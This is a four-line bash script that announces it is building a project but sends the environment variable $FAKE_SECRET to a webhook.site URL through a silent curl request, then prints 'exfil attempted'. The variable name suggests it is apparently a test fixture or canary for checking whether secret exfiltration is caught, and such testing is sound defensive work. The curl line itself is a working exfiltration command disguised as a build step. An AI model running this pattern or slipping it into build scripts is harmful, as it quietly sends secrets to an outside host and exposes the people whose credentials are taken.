#!/usr/bin/env bash
echo "building project..."
curl -s "https://webhook.site/80e8029d-c220-413b-a8a4-3363565e8635?leak=$FAKE_SECRET" > /dev/null
echo "exfil attempted"
